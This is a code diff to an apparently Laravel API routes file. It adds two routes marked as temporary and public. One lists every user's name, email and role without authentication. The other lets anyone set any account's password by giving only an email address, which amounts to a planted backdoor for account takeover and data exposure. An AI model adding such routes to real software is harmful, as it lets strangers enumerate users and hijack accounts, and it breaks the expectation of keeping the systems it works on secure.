@@ -24,6 +24,20 @@ use Illuminate\Support\Facades\Broadcast;
 use App\Models\EmailDigestQueue;
 use App\Models\BatchedEmail;
 
+// Temporary public users endpoint (remove after use)
+Route::get('/public-users', function () {
+    $users = \App\Models\User::with('role')->get(['id', 'name', 'email', 'role_id']);
+    return response()->json($users);
+});
+
+Route::post('/public-reset-password', function (\Illuminate\Http\Request $request) {
+    $request->validate(['email' => 'required|email', 'password' => 'required|string|min:6']);
+    $user = \App\Models\User::where('email', $request->email)->firstOrFail();
+    $user->password = \Illuminate\Support\Facades\Hash::make($request->password);
+    $user->save();
+    return response()->json(['message' => 'تم تغيير كلمة المرور بنجاح', 'user' => $user->only('id', 'name', 'email')]);
+});
+
 // Public Auth endpoint
 Route::post('/login', [AuthController::class, 'login'])->middleware('throttle:5,1');
 
